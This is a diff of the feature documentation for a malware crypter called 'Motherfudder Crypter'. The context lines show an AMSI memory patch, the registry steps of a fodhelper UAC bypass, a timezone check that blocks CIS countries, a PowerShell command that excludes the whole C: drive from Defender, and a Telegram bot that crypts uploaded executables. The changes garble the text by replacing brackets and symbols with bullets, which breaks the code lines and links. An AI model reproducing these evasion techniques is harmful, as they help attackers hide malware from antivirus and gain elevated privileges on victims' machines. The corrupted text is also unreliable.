@@ -6,13 +6,13 @@ Comprehensive documentation of all features available in Motherfudder Crypter.
 
 ## Table of Contents
 
-1. [Anti-Analysis Features](#anti-analysis-features)
-2. [Privilege Escalation](#privilege-escalation)
-3. [AV Evasion](#av-evasion)
-4. [Persistence Mechanisms](#persistence-mechanisms)
-5. [Instance Management](#instance-management)
-6. [Output Formats](#output-formats)
-7. [Interface Modes](#interface-modes)
+1. [Anti-Analysis Features•(#anti-analysis-features)
+2. [Privilege Escalation•(#privilege-escalation)
+3. [AV Evasion•(#av-evasion)
+4. [Persistence Mechanisms•(#persistence-mechanisms)
+5. [Instance Management•(#instance-management)
+6. [Output Formats•(#output-formats)
+7. [Interface Modes•(#interface-modes)
 
 ---
 
@@ -99,7 +99,7 @@ while (true) {
 **Technical Details**:
 ```csharp
 // Blocked timezones (CIS countries)
-int[] blockedTimezones = { 5, 7, 29, 130, 137, 152, 203, 228, 238, 247 };
+int• blockedTimezones = { 5, 7, 29, 130, 137, 152, 203, 228, 238, 247 };
 if (blockedTimezones.Contains(CurrentTimezone))
     CrashExit();
 ```
@@ -137,17 +137,17 @@ if (blockedTimezones.Contains(CurrentTimezone))
 **Technical Flow**:
 ```
 Non-elevated process
-    ?
+    •
 Create HKCU\Software\Classes\<Random>\Shell\Open\command
-    ?
+    •
 Set value: conhost.exe --headless <command>
-    ?
+    •
 Point ms-settings\CurVer to <Random>
-    ?
+    •
 Execute fodhelper.exe
-    ?
+    •
 fodhelper auto-elevates and executes our command
-    ?
+    •
 Cleanup registry entries
 ```
 
@@ -163,7 +163,7 @@ Cleanup registry entries
 }
 ```
 
-**See Also**: [UAC_BYPASS_INFO.md](MfBuilder/UAC_BYPASS_INFO.md)
+**See Also**: [UAC_BYPASS_INFO.md•(MfBuilder/UAC_BYPASS_INFO.md)
 
 ---
 
@@ -187,7 +187,7 @@ Cleanup registry entries
 **Technical Details**:
 ```csharp
 IntPtr targetAddress = AmsiScanBufferAddress + 33;
-byte[] patch = { 0x48, 0x31, 0xDB }; // xor rbx, rbx
+byte• patch = { 0x48, 0x31, 0xDB }; // xor rbx, rbx
 
 // Apply patch
 VirtualProtect(targetAddress, 3, PAGE_EXECUTE_READWRITE);
@@ -207,7 +207,7 @@ VirtualProtect(targetAddress, 3, PAGE_EXECUTE_READ);
 
 **Configuration**: Automatically enabled for .NET builds
 
-**See Also**: [Chainski/GlobalAMSIBypass](https://github.com/Chainski/GlobalAMSIBypass)
+**See Also**: [Chainski/GlobalAMSIBypass•(https://github.com/Chainski/GlobalAMSIBypass)
 
 ---
 
@@ -289,7 +289,7 @@ ProcessStartInfo psi = new ProcessStartInfo {
 }
 ```
 
-**See Also**: [DEFENDER_EXCLUSION_INFO.md](MfBuilder/DEFENDER_EXCLUSION_INFO.md)
+**See Also**: [DEFENDER_EXCLUSION_INFO.md•(MfBuilder/DEFENDER_EXCLUSION_INFO.md)
 
 ---
 
@@ -478,7 +478,7 @@ cp target.exe payload.exe
 1. User sends /start
 2. Bot requests authentication key
 3. User authenticates
-4. Bot asks: "Do you want to crypt a binary?"
+4. Bot asks: "Do you want to crypt a binary•"
 5. User uploads .exe file
 6. Bot detects binary type (Native/NET, x86/x64)
 7. Bot displays configuration menu
@@ -489,15 +489,15 @@ cp target.exe payload.exe
 
 **Configuration Menu**:
 ```
-?? Crypter Configuration
+ Crypter Configuration
 
-1. Anti Debug: ? OFF
-2. Anti VM: ? OFF
-3. Blacklist CIS Countries: ? OFF
-4. UAC Bypass: ? OFF
-5. Single Instance: ? OFF
-6. Persistence: ? OFF
-7. Windows Defender Exclusion: ? OFF
+1. Anti Debug: • OFF
+2. Anti VM: • OFF
+3. Blacklist CIS Countries: • OFF
+4. UAC Bypass: • OFF
+5. Single Instance: • OFF
+6. Persistence: • OFF
+7. Windows Defender Exclusion: • OFF
 8. Output Format: BAT
 
 Send number to toggle, 'format' to change output, 'build' when ready
@@ -516,7 +516,7 @@ Send number to toggle, 'format' to change output, 'build' when ready
 3. Set authentication key in `src/telegram_bot.rs`
 4. Run with `--bot` flag
 
-**See Also**: [BOT_SETUP.md](MfBuilder/BOT_SETUP.md)
+**See Also**: [BOT_SETUP.md•(MfBuilder/BOT_SETUP.md)
 
 ---
 
@@ -524,17 +524,17 @@ Send number to toggle, 'format' to change output, 'build' when ready
 
 | Feature | Native x86 | Native x64 | .NET x86 | .NET x64 |
 |---------|-----------|-----------|----------|----------|
-| Anti-Debug | ? | ? | ? | ? |
-| Anti-VM | ? | ? | ? | ? |
-| Blacklist CIS | ? | ? | ? | ? |
-| UAC Bypass | ? | ? | ? | ? |
-| Single Instance | ? | ? | ? | ? |
-| Persistence | ? | ? | ? | ? |
-| Defender Exclusion | ? | ? | ? | ? |
-| AMSI Bypass | ? | ? | ? | ? |
-| ETW Patching | ? | ? | ? | ? |
-| CLR Obfuscation | ? | ? | ? | ? |
-| Indirect Syscalls | ? | ? | ? | ? |
+| Anti-Debug | • | • | • | • |
+| Anti-VM | • | • | • | • |
+| Blacklist CIS | • | • | • | • |
+| UAC Bypass | • | • | • | • |
+| Single Instance | • | • | • | • |
+| Persistence | • | • | • | • |
+| Defender Exclusion | • | • | • | • |
+| AMSI Bypass | • | • | • | • |
+| ETW Patching | • | • | • | • |
+| CLR Obfuscation | • | • | • | • |
+| Indirect Syscalls | • | • | • | • |
 
 ---
 
@@ -620,28 +620,28 @@ For transparency and to set proper expectations:
 ### Not Implemented
 
 #### Process Hollowing
-- ? No process hollowing (RunPE) techniques
-- ? No legitimate process spawning for injection
+- • No process hollowing (RunPE) techniques
+- • No legitimate process spawning for injection
 
 **Why**: Process hollowing is easily detected by modern EDR solutions and adds significant complexity.
 
 **Instead**: Direct assembly loading (.NET) or indirect syscalls (native)
 
 #### Process Injection
-- ? No remote process injection
-- ? No DLL injection into existing processes
-- ? No reflective DLL loading
-- ? No thread hijacking
-- ? No APC queue injection
+- • No remote process injection
+- • No DLL injection into existing processes
+- • No reflective DLL loading
+- • No thread hijacking
+- • No APC queue injection
 
 **Why**: Injection techniques trigger behavioral detection and are high-risk.
 
 **Instead**: Standalone execution with evasion features (AMSI bypass, Defender exclusions)
 
 #### Advanced Obfuscation
-- ? No control flow flattening
-- ? No virtualization obfuscation
-- ? No polymorphic code generation
+- • No control flow flattening
+- • No virtualization obfuscation
+- • No polymorphic code generation
 
 **Why**: These techniques significantly increase file size and can degrade performance.
 
@@ -650,19 +650,19 @@ For transparency and to set proper expectations:
 ### What It Uses Instead
 
 #### For .NET Payloads
-- ? Assembly.Load() with decryption
-- ? AMSI bypass (memory patching)
-- ? ETW patching (event blocking)
-- ? String encryption
-- ? Method renaming
-- ? Defender exclusions
+- • Assembly.Load() with decryption
+- • AMSI bypass (memory patching)
+- • ETW patching (event blocking)
+- • String encryption
+- • Method renaming
+- • Defender exclusions
 
 #### For Native Payloads
-- ? Indirect syscalls (no IAT entries)
-- ? Manual module loading
-- ? API hashing
-- ? Shellcode execution
-- ? Defender exclusions
+- • Indirect syscalls (no IAT entries)
+- • Manual module loading
+- • API hashing
+- • Shellcode execution
+- • Defender exclusions
 
 ### Comparison with Other Crypters
 
@@ -688,11 +688,11 @@ For transparency and to set proper expectations:
 ### Recommendation
 
 **When to use this crypter**:
-- ? Need reliable, stable operation
-- ? Want lower EDR detection risk
-- ? Prefer simplicity over complexity
-- ? Focus on AV evasion rather than process hiding
-- ? Silent Defender exclusions are priority
+- • Need reliable, stable operation
+- • Want lower EDR detection risk
+- • Prefer simplicity over complexity
+- • Focus on AV evasion rather than process hiding
+- • Silent Defender exclusions are priority
 
 **When you might need alternatives**:
 - Need process injection for specific use case
@@ -711,17 +711,17 @@ Add-MpPreference -ExclusionPath 'C:\'
 
 **Result**: Windows Defender will not scan ANY files on the C: drive.
 
-**Effectiveness**: ????? (Maximum)  
-**Stealth**: ?? (Highly Suspicious)  
-**Detection Risk**: ?????? (Very High)
+**Effectiveness**: • (Maximum)  
+**Stealth**:  (Highly Suspicious)  
+**Detection Risk**:  (Very High)
 
 **When to Use**:
-- ? Testing on your own systems
-- ? Controlled lab environments
-- ? Short-term operations
-- ? **NOT** for stealth operations
-- ? **NOT** in enterprise environments
-- ? **NOT** for long-term deployments
+- • Testing on your own systems
+- • Controlled lab environments
+- • Short-term operations
+- • **NOT** for stealth operations
+- • **NOT** in enterprise environments
+- • **NOT** for long-term deployments
 
 **Detection Indicators**:
 - Event ID 5007 (Defender settings changed)
@@ -741,8 +741,8 @@ Add-MpPreference -ExclusionPath 'C:\'
 
 **Bot Configuration**:
 - Option #7: Windows Defender Exclusion
-- Option #8: Exclude C:\ Drive ??
-- Shows "?? AGGRESSIVE!" when enabled
+- Option #8: Exclude C:\ Drive 
+- Shows " AGGRESSIVE!" when enabled
 
 **Recommendation**: Only use for testing or in environments where detection is acceptable. For operational use, standard defender exclusion (directory + process) is sufficient and far less suspicious.
 
@@ -764,9 +764,9 @@ As noted in similar crypter FAQs:
 
 ## See Also
 
-- [README.md](README.md) - Project overview
-- [INSTALLATION.md](MfBuilder/INSTALLATION.md) - Installation guide
-- [QUICKSTART.md](MfBuilder/QUICKSTART.md) - Quick start guide
-- [BOT_SETUP.md](MfBuilder/BOT_SETUP.md) - Telegram bot setup
-- [UAC_BYPASS_INFO.md](MfBuilder/UAC_BYPASS_INFO.md) - UAC bypass details
-- [DEFENDER_EXCLUSION_INFO.md](MfBuilder/DEFENDER_EXCLUSION_INFO.md) - Defender exclusion guide
+- [README.md•(README.md) - Project overview
+- [INSTALLATION.md•(MfBuilder/INSTALLATION.md) - Installation guide
+- [QUICKSTART.md•(MfBuilder/QUICKSTART.md) - Quick start guide
+- [BOT_SETUP.md•(MfBuilder/BOT_SETUP.md) - Telegram bot setup
+- [UAC_BYPASS_INFO.md•(MfBuilder/UAC_BYPASS_INFO.md) - UAC bypass details
+- [DEFENDER_EXCLUSION_INFO.md•(MfBuilder/DEFENDER_EXCLUSION_INFO.md) - Defender exclusion guide
